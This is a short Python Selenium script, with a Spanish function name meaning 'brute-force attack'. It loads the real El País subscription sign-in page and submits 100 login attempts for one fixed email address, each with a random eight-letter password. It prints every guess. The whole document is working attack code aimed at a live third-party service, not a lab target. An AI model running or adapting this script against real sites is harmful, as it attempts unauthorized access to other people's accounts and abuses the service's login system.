import time
import string
import random
from selenium import webdriver

def AtaqueFuerzaBruta():
    driver = webdriver.Chrome("D:\Reespaldo\Guias y documentos\Criptografia\chromedriver")
    driver.get("https://elpais.com/subscriptions/#/sign-in?prod=REG&o=CABEP&backURL=https%3A%2F%2Felpais.com")
    time.sleep(3)
    driver.find_element_by_id("didomi-notice-agree-button").click()
    time.sleep(2)
    base = string.ascii_letters

    for x in range(100):
        user = driver.find_element_by_id("subsEmail")
        user.clear()
        user.send_keys("widofo4697@akapple.com")
        time.sleep(1)   
        password = driver.find_element_by_id("subsPassword")
        password.clear()
        passRandom = ''.join(random.choice(base) for i in range(8))
        password.send_keys(passRandom)
        time.sleep(1)
        print("Intento numero " + str(x + 1) + ": " + str(passRandom))
        driver.find_element_by_id("subsSignIn").click()

AtaqueFuerzaBruta()